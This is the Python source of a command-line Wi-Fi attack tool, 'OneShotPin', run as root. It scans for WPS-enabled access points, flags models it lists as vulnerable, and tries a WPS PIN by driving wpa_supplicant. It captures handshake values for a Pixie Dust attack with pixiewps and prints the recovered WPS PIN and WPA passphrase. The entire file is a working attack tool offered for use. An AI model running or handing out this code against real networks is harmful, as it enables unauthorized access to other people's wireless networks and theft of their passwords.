#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs


class Data():
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.wpa_psk = ''
        self.state = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, data.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class Options():
    def __init__(self):
        self.interface = None
        self.bssid = None
        self.pin = None
        self.essid = None
        self.pixiemode = False
        self.full_range = False
        self.showpixiecmd = False
        self.verbose = False


def shellcmd(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
    result = proc.stdout.read()
    proc.wait()
    return result


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def run_wpa_supplicant(options):
    options.tempdir = tempfile.mkdtemp()
    with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
        temp.write("ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n".format(options.tempdir))
        options.tempconf = temp.name
    cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(options.interface, options.tempconf)
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
    return proc


def run_wpa_cli(options):
    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
    proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, encoding='utf-8')
    recvuntil(proc, '\n>')
    return proc


def wps_reg(options):
    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
    command = 'wps_reg {} {}\nquit\n'.format(options.bssid, options.pin)
    proc = subprocess.run(cmd, shell=True, input=command, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, encoding='utf-8')
    status = False
    if 'OK' in proc.stdout:
        status = True
    return status


def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
    if res.returncode == 0:
        return True
    else:
        return False


def statechange(data, old, new):
    data.state = new
    return True


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


def process_wpa_supplicant(pipe, options, data):
    line = pipe.stdout.readline()
    if line == '':
        pipe.wait()
        return False
    line = line.rstrip('\n')

    if options.verbose: sys.stderr.write(line + '\n')

    if line.startswith('WPS: '):
        if 'Building Message M' in line:
            statechange(data, data.state, 'M' + line.split('Building Message M')[1])
            print('[*] Sending WPS Message {}...'.format(data.state))
        elif 'Received M' in line:
            statechange(data, data.state, 'M' + line.split('Received M')[1])
            print('[*] Received WPS Message {}'.format(data.state))
        elif 'Received WSC_NACK' in line:
            statechange(data, data.state, 'WSC_NACK')
            print('[*] Received WSC NACK')
        elif 'Enrollee Nonce' in line and 'hexdump' in line:
            data.e_nonce = get_hex(line)
            assert(len(data.e_nonce) == 16*2)
            if options.pixiemode: print('[P] E-Nonce: {}'.format(data.e_nonce))
        elif 'DH own Public Key' in line and 'hexdump' in line:
            data.pkr = get_hex(line)
            assert(len(data.pkr) == 192*2)
            if options.pixiemode: print('[P] PKR: {}'.format(data.pkr))
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            data.pke = get_hex(line)
            assert(len(data.pke) == 192*2)
            if options.pixiemode: print('[P] PKE: {}'.format(data.pke))
        elif 'AuthKey' in line and 'hexdump' in line:
            data.authkey = get_hex(line)
            assert(len(data.authkey) == 32*2)
            if options.pixiemode: print('[P] AuthKey: {}'.format(data.authkey))
        elif 'E-Hash1' in line and 'hexdump' in line:
            data.e_hash1 = get_hex(line)
            assert(len(data.e_hash1) == 32*2)
            if options.pixiemode: print('[P] E-Hash1: {}'.format(data.e_hash1))
        elif 'E-Hash2' in line and 'hexdump' in line:
            data.e_hash2 = get_hex(line)
            assert(len(data.e_hash2) == 32*2)
            if options.pixiemode: print('[P] E-Hash2: {}'.format(data.e_hash2))
        elif 'Network Key' in line and 'hexdump' in line:
            data.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
            statechange(data, data.state, 'GOT_PSK')

    elif ': State: ' in line:
        statechange(data, *line.split(': State: ')[1].split(' -> '))
        if '-> SCANNING' in line:
            print('[*] Scanning...')
    elif 'WPS-FAIL' in line:
        statechange(data, data.state, 'WPS-FAIL')
    elif 'NL80211_CMD_DEL_STATION' in line:
        print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
    elif 'Trying to authenticate with' in line:
        if 'SSID' in line: options.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
        print('[*] Authenticating...')
    elif 'Authentication response' in line:
        print('[+] Authenticated')
    elif 'Trying to associate with' in line:
        if 'SSID' in line: options.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
        print('[*] Associating with AP...')
    elif 'Associated with' in line and options.interface in line:
        if options.essid:
            print('[+] Associated with {} (ESSID: {})'.format(options.bssid, options.essid))
        else:
            print('[+] Associated with {}'.format(options.bssid))
    elif 'EAPOL: txStart' in line:
        statechange(data, data.state, 'EAPOL Start')
        print('[*] Sending EAPOL Start...')
    elif 'EAP entering state IDENTITY' in line:
        print('[*] Received Identity Request')
    elif 'using real identity' in line:
        print('[*] Sending Identity Response...')

    return True


def poll_wpa_supplicant(wpas, options, data):
    while True:
        res = process_wpa_supplicant(wpas, options, data)

        if not res:
            break
        if data.state == 'WSC_NACK':
            print('[-] Error: wrong PIN code')
            break
        elif data.state == 'GOT_PSK':
            break
        elif data.state == 'WPS-FAIL':
            print('[-] WPS-FAIL error')
            break
    if data.wpa_psk:
        return True
    if data.got_all():
        return True
    return False


def connect(options, data):
    print('[*] Running wpa_supplicant...')
    ifaceUp(options.interface)
    wpas = run_wpa_supplicant(options)

    try:
        while True:
            s = recvuntil(wpas, '\n')
            if options.verbose: sys.stderr.write(s)
            if 'update_config=1' in s:
                break
    except KeyboardInterrupt:
        print("\nAborting...")
        cleanup(wpas, options)
        ifaceUp(options.interface, down=True)
        sys.exit(1)

    print('[*] Trying PIN "{}"...'.format(options.pin))
    wps_reg(options)

    try:
        res = poll_wpa_supplicant(wpas, options, data)
    except KeyboardInterrupt:
        print("\nAborting...")
        cleanup(wpas, options)
        ifaceUp(options.interface, down=True)
        sys.exit(1)
    cleanup(wpas, options)
    ifaceUp(options.interface, down=True)
    return res


def wifi_scan(iface):
    '''Parsing iw scan results'''
    def handle_network(line, result, networks):
        networks.append(
                {
                    'Security type': 'Unknown',
                    'WPS': False,
                    'WPS locked': False,
                    'Model': '',
                    'Model number': '',
                    'Device name': ''
                 }
            )
        networks[-1]['BSSID'] = result.group(1).upper()

    def handle_essid(line, result, networks):
        d = result.group(1)
        networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')

    def handle_level(line, result, networks):
        networks[-1]['Level'] = int(float(result.group(1)))

    def handle_securityType(line, result, networks):
        sec = networks[-1]['Security type']
        if result.group(1) == 'capability':
            if 'Privacy' in result.group(2):
                sec = 'WEP'
            else:
                sec = 'Open'
        elif sec == 'WEP':
            if result.group(1) == 'RSN':
                sec = 'WPA2'
            elif result.group(1) == 'WPA':
                sec = 'WPA'
        elif sec == 'WPA':
            if result.group(1) == 'RSN':
                sec = 'WPA/WPA2'
        elif sec == 'WPA2':
            if result.group(1) == 'WPA':
                sec = 'WPA/WPA2'
        networks[-1]['Security type'] = sec

    def handle_wps(line, result, networks):
        networks[-1]['WPS'] = result.group(1)

    def handle_wpsLocked(line, result, networks):
        flag = int(result.group(1), 16)
        if flag:
            networks[-1]['WPS locked'] = True

    def handle_model(line, result, networks):
        d = result.group(1)
        networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')

    def handle_modelNumber(line, result, networks):
        d = result.group(1)
        networks[-1]['Model number'] =  codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')

    def handle_deviceName(line, result, networks):
        d = result.group(1)
        networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')

    cmd = 'iw dev {} scan'.format(iface)
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, encoding='utf-8')
    lines = proc.stdout.splitlines()
    networks = []
    matchers = {
        re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
        re.compile(r'SSID: (.*)'): handle_essid,
        re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
        re.compile(r'(capability): (.+)'): handle_securityType,
        re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
        re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
        re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
        re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
        re.compile(r' [*] Model: (.*)'): handle_model,
        re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
        re.compile(r' [*] Device name: (.*)'): handle_deviceName
    }

    for line in lines:
        line = line.strip('\t')
        for regexp, handler in matchers.items():
            res = re.match(regexp, line)
            if res:
                handler(line, res, networks)

    # Filtering non-WPS networks
    networks = list(filter(lambda x: bool(x['WPS']), networks))
    # Sorting by signal level
    networks.sort(key=lambda x: x['Level'], reverse=True)
    return networks


def scanner_pretty_print(networks, vuln_list=[]):
    '''Printing WiFiScan result as table'''
    def truncateStr(s, l):
        '''
        Truncate string with the specified length
        @s — input string
        @l — length of output string
        '''
        if len(s) > l:
            k = l - 3
            s = s[:k] + '...'
        return s

    def colored(text, color=None):
        '''Returns colored text'''
        if color:
            if color == 'green':
                text = '\033[92m{}\033[00m'.format(text)
            elif color == 'red':
                text = '\033[91m{}\033[00m'.format(text)
            else:
                return text
        else:
            return text
        return text

    print(colored('Green', color='green'), '— possible vulnerable network',
          '\n' + colored('Red', color='red'), '— WPS locked',
          '\nNetworks list:')
    print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
        '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
    for i in range(0, len(networks)):
        n = i + 1
        number = '{})'.format(n)
        network = networks[i]
        model = '{} {}'.format(network['Model'], network['Model number'])
        essid = truncateStr(network['ESSID'], 25)
        deviceName = truncateStr(network['Device name'], 27)
        line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            number, network['BSSID'], essid,
            network['Security type'], network['Level'],
            deviceName, model
            )
        if network['WPS locked']:
            print(colored(line, color='red'))
        elif model in vuln_list:
            print(colored(line, color='green'))
        else:
            print(line)


def suggest_network(options, vuln_list):
    networks = wifi_scan(options.interface)
    if not networks:
        die('No networks found.')
    scanner_pretty_print(networks, vuln_list)
    while 1:
        networkNo = input('Select target: ')
        try:
            if int(networkNo) in range(1, len(networks)+1):
                options.bssid = networks[int(networkNo) - 1]['BSSID']
            else:
                raise IndexError
        except Exception:
            print('Invalid number')
        else:
            break


def parse_pixiewps(output):
    lines = output.splitlines()
    for line in lines:
        if ('[+]' in line) and ('WPS' in line):
            pin = line.split(':')[-1].strip()
            return pin
    return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    die("""
OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg

{} <arguments>

Required Arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional Arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -F, --force              : Run Pixiewps with --force option (bruteforce full range)
    -X                       : Alway print Pixiewps command
    -v                       : Verbose output

Example:
    {} -i wlan0 -b 00:90:4C:C1:AC:21 -K
""".format(sys.argv[0], sys.argv[0]))


def cleanup(wpas, options):
    wpas.terminate()
    shutil.rmtree(options.tempdir, ignore_errors=True)
    os.remove(options.tempconf)


if __name__ == '__main__':
    VULNWSCFILE = 'vulnwsc.txt'
    options = Options()

    import getopt
    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XFKv", ["help", "interface", "bssid", "pin", "force", "pixie-dust"])
    for a, b in optlist:
        if a in ('-i', "--interface"): options.interface = b
        elif a in ('-b', "--bssid"): options.bssid = b.upper()
        elif a in ('-p', "--pin"): options.pin = b
        elif a in ('-K', "--pixie-dust"): options.pixiemode = True
        elif a in ('-F', "--force"): options.full_range = True
        elif a in ('-X'): options.showpixiecmd = True
        elif a in ('-v'): options.verbose = True
        elif a == '--help': usage()
    if os.getuid() != 0:
        die("Run it as root")
    if not options.interface:
        die("Please specify interface name (-i) (use --help for usage)")
    if options.pin is None:
        if options.pixiemode:
            options.pin = '12345670'
        else:
            die("You need to supply a pin or enable pixiemode (-K)! (use --help for usage)")
    if not ifaceUp(options.interface):
        die('Unable to up interface "{}"'.format(options.interface))
    if not options.bssid:
        print('BSSID not specified (--bssid) — scanning for available networks...')
        try:
            with open(VULNWSCFILE, 'r') as file:
                vuln_list = file.read().splitlines()
        except FileNotFoundError:
            vuln_list = []
        try:
            suggest_network(options, vuln_list)
        except KeyboardInterrupt:
            ifaceUp(options.interface, down=True)
            die('\nAborting...')

    data = Data()
    connect(options, data)

    if data.wpa_psk:
        print("[+] WPS PIN: '{}'".format(options.pin))
        print("[+] WPA PSK: '{}'".format(data.wpa_psk))
        print("[+] AP SSID: '{}'".format(options.essid))
        sys.exit(0)

    elif data.got_all() and options.pixiemode:
        pixiecmd = data.get_pixie_cmd(options.full_range)
        print("Running Pixiewps...")
        if options.verbose or options.showpixiecmd: print("Cmd: {}".format(pixiecmd))
        out = shellcmd(pixiecmd)
        print(out)
        a = parse_pixiewps(out)
        if a and a != '<empty>':
            options.pin = a
            options.pixiemode = False
            data.clear()
            print('[+] Trying to get WPA PSK with the correct PIN...'.format(options.pin))
            connect(options, data)

            if data.wpa_psk:
                print("[+] WPS PIN: '{}'".format(options.pin))
                print("[+] WPA PSK: '{}'".format(data.wpa_psk))
                print("[+] AP SSID: '{}'".format(options.essid))
                sys.exit(0)
            sys.exit(1)
    elif options.pixiemode:
        print('[!] No enough data to run Pixie Dust attack')
        sys.exit(1)

    sys.exit(1)
